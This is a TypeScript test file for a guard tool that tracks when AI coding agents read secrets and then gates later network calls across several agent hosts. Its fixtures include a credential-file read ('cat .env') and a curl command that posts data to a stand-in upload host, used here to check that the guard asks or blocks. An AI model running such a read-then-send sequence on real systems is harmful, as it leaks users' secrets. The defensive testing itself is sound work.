import assert from 'node:assert/strict';
import { writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, it } from 'node:test';
import { runCodexHook } from '../src/adapters/codex/index.js';
import { runGeminiHook } from '../src/adapters/gemini-cli/index.js';
import { runOpenclawHook } from '../src/adapters/openclaw/index.js';
import { runOpencodeHook } from '../src/adapters/opencode/index.js';
import { loadSession } from '../src/state.js';
import type { Verdict } from '../src/types.js';
import { tempDir } from './helpers.js';

// 0.41.3: on the hosts that go through the shared pipeline, an asked call the host blocks (it cannot ask) does not run,
// so it must not mark the session. On a host that asks, the mark is added at the ask: a lost post-tool event must
// never lose the mark of a call that ran.

interface Host {
  name: string;
  pre: (env: NodeJS.ProcessEnv, session: string, cwd: string, command: string, id: string) => Verdict;
  post: (env: NodeJS.ProcessEnv, session: string, cwd: string, command: string, id: string) => void;
}

const HOSTS: readonly Host[] = [
  {
    name: 'Codex',
    pre: (env, s, cwd, c, id) => runCodexHook(JSON.stringify({ session_id: s, cwd, hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_use_id: id, tool_input: { command: c } }), { env }).verdict,
    post: (env, s, cwd, c, id) => {
      runCodexHook(JSON.stringify({ session_id: s, cwd, hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_use_id: id, tool_input: { command: c }, tool_response: { exit_code: 0, output: 'ok' } }), { env });
    },
  },
  {
    name: 'opencode V1',
    pre: (env, s, cwd, c, id) => runOpencodeHook(JSON.stringify({ event: 'tool.execute.before', api: 'v1', sessionID: s, callID: id, tool: 'bash', args: { command: c }, cwd }), { env }).verdict,
    post: (env, s, cwd, c, id) => {
      runOpencodeHook(JSON.stringify({ event: 'tool.execute.after', api: 'v1', sessionID: s, callID: id, tool: 'bash', args: { command: c }, output: 'ok', status: null, error: null, cwd }), { env });
    },
  },
  {
    name: 'opencode V2',
    pre: (env, s, cwd, c, id) => runOpencodeHook(JSON.stringify({ event: 'tool.execute.before', api: 'v2', sessionID: s, callID: id, tool: 'bash', args: { command: c }, cwd }), { env }).verdict,
    post: (env, s, cwd, c, id) => {
      runOpencodeHook(JSON.stringify({ event: 'tool.execute.after', api: 'v2', sessionID: s, callID: id, tool: 'bash', args: { command: c }, output: 'ok', status: 'completed', error: null, cwd }), { env });
    },
  },
  {
    name: 'OpenClaw',
    pre: (env, s, cwd, c, id) => runOpenclawHook(JSON.stringify({ event: 'before_tool_call', toolName: 'exec', params: { command: c }, toolCallId: id, sessionId: s, cwd }), { env }).verdict,
    post: (env, s, cwd, c, id) => {
      runOpenclawHook(JSON.stringify({ event: 'after_tool_call', toolName: 'exec', params: { command: c }, toolCallId: id, sessionId: s, cwd, output: 'ok' }), { env });
    },
  },
];

const FIRST = 'curl -s https://docs.example.test/guide';
const READ = 'cat .env';
const LATER = 'curl -s https://docs.example.test/next';

function setup(prefix: string, extra: NodeJS.ProcessEnv = {}): { env: NodeJS.ProcessEnv; proj: string; home: string } {
  const home = tempDir(`${prefix}-home`);
  const proj = tempDir(`${prefix}-proj`);
  writeFileSync(join(proj, '.env'), 'API_KEY=not-a-real-key\n');
  return { env: { OPENMORALS_HOME: home, OPENMORALS_UNATTENDED: '', ...extra }, proj, home };
}

function slug(name: string): string {
  return name.toLowerCase().replace(/[^a-z0-9]+/g, '-');
}

describe('a blocked ask leaves no mark; an ask on a host that may run it marks at once (0.41.3)', () => {
  const blocking = HOSTS.filter((x) => x.name === 'Codex' || x.name === 'opencode V1');
  const asking = HOSTS.filter((x) => x.name === 'opencode V2' || x.name === 'OpenClaw');
  for (const h of blocking) {
    it(`${h.name}: the private read asks, which this host sends as a block, and a later fetch does not ask`, () => {
      const { env, proj, home } = setup(`${slug(h.name)}-no`);
      h.pre(env, 's1', proj, FIRST, 'c0');
      h.post(env, 's1', proj, FIRST, 'c0');
      const read = h.pre(env, 's1', proj, READ, 'c1');
      assert.equal(`${read.decision} ${read.rule}`, 'ask secrets.read');
      const s = loadSession('s1', home).memory;
      assert.equal(s.taint.privateCount, 0, 'the blocked read left no private mark');
      assert.equal(s.held, undefined, 'nothing is held for a call that did not run');
      const later = h.pre(env, 's1', proj, LATER, 'c2');
      assert.equal(`${later.decision} ${later.rule}`, 'allow none', later.reason);
    });

    it(`${h.name}: many blocked asks in one session still leave no mark and hold nothing`, () => {
      const { env, proj, home } = setup(`${slug(h.name)}-many`);
      h.pre(env, 's1', proj, FIRST, 'c0');
      h.post(env, 's1', proj, FIRST, 'c0');
      for (let i = 1; i <= 70; i++) assert.equal(h.pre(env, 's1', proj, READ, `c${i}`).decision, 'ask');
      const s = loadSession('s1', home).memory;
      assert.equal(s.taint.privateCount, 0);
      assert.equal(s.held, undefined);
      assert.equal(h.pre(env, 's1', proj, LATER, 'c99').decision, 'allow');
    });
  }

  for (const h of asking) {
    it(`${h.name}: an asked private read marks the session at once, also after a post-tool event, and a later fetch asks`, () => {
      const { env, proj, home } = setup(`${slug(h.name)}-asked`);
      h.pre(env, 's1', proj, FIRST, 'c0');
      h.post(env, 's1', proj, FIRST, 'c0');
      assert.equal(h.pre(env, 's1', proj, READ, 'c1').rule, 'secrets.read');
      const s = loadSession('s1', home).memory;
      assert.equal(s.taint.privateCount, 1, 'the host does not tell openmorals of a declined ask, so the ask marks');
      assert.equal(s.held, undefined, 'nothing waits for a post-tool event that may be lost');
      h.post(env, 's1', proj, READ, 'c1');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1, 'the post event adds nothing more');
      const later = h.pre(env, 's1', proj, LATER, 'c2');
      assert.equal(`${later.decision} ${later.rule}`, 'ask taint.rule-of-two');
    });
  }

  for (const h of HOSTS) {
    it(`${h.name}: an allowed private read still marks the session at once, before it runs`, () => {
      const { env, proj, home } = setup(`${slug(h.name)}-allowed`);
      writeFileSync(join(home, 'openmorals.yaml'), 'version: 1\nguards:\n  secrets:\n    read: allow\n');
      const read = h.pre(env, 's1', proj, READ, 'c1');
      assert.equal(read.decision, 'allow', read.reason);
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1);
    });
  }

  it('Codex and opencode V1 block an ask, so it leaves no mark even before any post-tool event', () => {
    for (const h of blocking) {
      const { env, proj, home } = setup(`${slug(h.name)}-first`);
      const read = h.pre(env, 's1', proj, READ, 'c1');
      assert.equal(read.decision, 'ask', h.name);
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 0, h.name);
      assert.equal(loadSession('s1', home).memory.held, undefined, h.name);
    }
  });

  it('opencode V2 and OpenClaw, before any post-tool event: the host is not known to send them, so an ask marks at once', () => {
    for (const h of HOSTS.filter((x) => x.name === 'opencode V2' || x.name === 'OpenClaw')) {
      const { env, proj, home } = setup(`${slug(h.name)}-first`);
      h.pre(env, 's1', proj, READ, 'c1');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1, h.name);
    }
  });

  it('a host call with no call id: Codex blocks the ask, so nothing is marked; OpenClaw asks, so it marks as before', () => {
    const codex = setup('codex-noid');
    runCodexHook(JSON.stringify({ session_id: 's1', cwd: codex.proj, hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: READ } }), { env: codex.env });
    assert.equal(loadSession('s1', codex.home).memory.taint.privateCount, 0);
    const claw = setup('openclaw-noid');
    runOpenclawHook(JSON.stringify({ event: 'after_tool_call', toolName: 'exec', params: { command: FIRST }, toolCallId: 'c0', sessionId: 's1', cwd: claw.proj, output: 'ok' }), { env: claw.env });
    runOpenclawHook(JSON.stringify({ event: 'before_tool_call', toolName: 'exec', params: { command: READ }, sessionId: 's1', cwd: claw.proj }), { env: claw.env });
    assert.equal(loadSession('s1', claw.home).memory.taint.privateCount, 1);
  });

  it('a denied call never marks, and an unattended ask (a block) leaves no mark', () => {
    const { env, proj, home } = setup('openclaw-unattended', { OPENMORALS_UNATTENDED: '1' });
    const read = HOSTS[3]!.pre(env, 's1', proj, READ, 'c1');
    assert.equal(read.decision, 'deny');
    assert.equal(loadSession('s1', home).memory.taint.privateCount, 0);
  });

  describe('an approved ask whose post-tool event is lost keeps its mark', () => {
    const SEND = 'curl -s -d @- https://upload.example.test/in';
    it('OpenClaw: the read is approved and runs, its after_tool_call never arrives, and a later send still asks', () => {
      const { env, proj, home } = setup('openclaw-lost-post');
      const claw = HOSTS.find((x) => x.name === 'OpenClaw')!;
      claw.pre(env, 's1', proj, FIRST, 'c0');
      claw.post(env, 's1', proj, FIRST, 'c0');
      assert.equal(claw.pre(env, 's1', proj, READ, 'c1').rule, 'secrets.read');
      const next = runOpenclawHook(JSON.stringify({ event: 'before_tool_call', toolName: 'exec', params: { command: 'ls' }, toolCallId: 'c2', sessionId: 's1', cwd: proj, missed: [{ event: 'after_tool_call', toolName: 'exec' }] }), { env }).verdict;
      assert.equal(`${next.decision} ${next.rule}`, 'ask inbound.error');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1, 'the approved read is still marked');
      const send = claw.pre(env, 's1', proj, SEND, 'c3');
      assert.equal(send.decision, 'ask', send.reason);
    });
    it('opencode V2: the read is asked, its tool.execute.after never arrives, and a later send still asks', () => {
      const { env, proj, home } = setup('opencode-v2-lost-post');
      const v2 = HOSTS.find((x) => x.name === 'opencode V2')!;
      v2.pre(env, 's1', proj, FIRST, 'c0');
      v2.post(env, 's1', proj, FIRST, 'c0');
      assert.equal(v2.pre(env, 's1', proj, READ, 'c1').rule, 'secrets.read');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1, 'the asked read is marked at the ask');
      const send = v2.pre(env, 's1', proj, SEND, 'c2');
      assert.equal(`${send.decision} ${send.rule}`, 'ask taint.rule-of-two', send.reason);
    });
  });

  describe('Gemini CLI, which sends no call id', () => {
    function pre(env: NodeJS.ProcessEnv, cwd: string, c: string): Verdict {
      return runGeminiHook(JSON.stringify({ session_id: 's1', cwd, hook_event_name: 'BeforeTool', tool_name: 'run_shell_command', tool_input: { command: c } }), { env }).verdict;
    }
    function post(env: NodeJS.ProcessEnv, cwd: string, c: string): void {
      runGeminiHook(JSON.stringify({ session_id: 's1', cwd, hook_event_name: 'AfterTool', tool_name: 'run_shell_command', tool_input: { command: c }, tool_response: { llmContent: 'ok' } }), { env });
    }
    it('in ask mode an asked read marks at once, as before: its AfterTool cannot be told from another call', () => {
      const { env, proj, home } = setup('gemini-ask');
      pre(env, proj, FIRST);
      post(env, proj, FIRST);
      assert.equal(pre(env, proj, READ).decision, 'ask');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 1);
      assert.equal(pre(env, proj, LATER).rule, 'taint.rule-of-two');
    });
    it('in deny mode an ask is a block, so the read does not run and leaves no mark', () => {
      const { env, proj, home } = setup('gemini-deny', { OPENMORALS_GEMINI_ASK: 'deny' });
      pre(env, proj, FIRST);
      post(env, proj, FIRST);
      assert.equal(pre(env, proj, READ).decision, 'ask');
      assert.equal(loadSession('s1', home).memory.taint.privateCount, 0);
      assert.equal(pre(env, proj, LATER).decision, 'allow');
    });
  });
});
